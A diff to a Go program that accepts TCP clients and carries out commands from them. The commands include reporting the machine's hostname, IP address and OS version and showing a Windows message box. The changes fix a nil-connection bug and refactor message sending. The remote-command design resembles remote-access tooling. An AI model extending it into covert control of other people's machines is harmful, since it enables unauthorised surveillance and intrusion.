@@ -28,8 +28,9 @@ func Listen() {
 		conn, err := server.Accept()
 		if err != nil {
 			fmt.Println("Could not accept client:", err)
+		} else {
+			go handleClient(conn)
 		}
-		go handleClient(conn)
 	}
 
 }
@@ -62,9 +63,7 @@ func handleClient(conn net.Conn) {
 				}
 			}
 
-			parameters := []string{command, hostname, ipAddress, os_version}
-
-			send(strings.Join(parameters, DELIM), conn)
+			send([]string{command, hostname, ipAddress, os_version}, conn)
 		case "show_messagebox":
 			fmt.Println(message)
 			message, _ := syscall.UTF16PtrFromString(string(split_message[1]))
@@ -106,8 +105,9 @@ func receive(conn net.Conn) (string, error) {
 
 }
 
-func send(message string, conn net.Conn) error {
-	finalMessage := []byte(fmt.Sprintf("%-10d%s", len(message), message))
+func send(message []string, conn net.Conn) error {
+	formattedMessage := strings.Join(message, DELIM)
+	finalMessage := []byte(fmt.Sprintf("%-10d%s", len(formattedMessage), formattedMessage))
 	_, err := conn.Write(finalMessage)
 	return err
 }
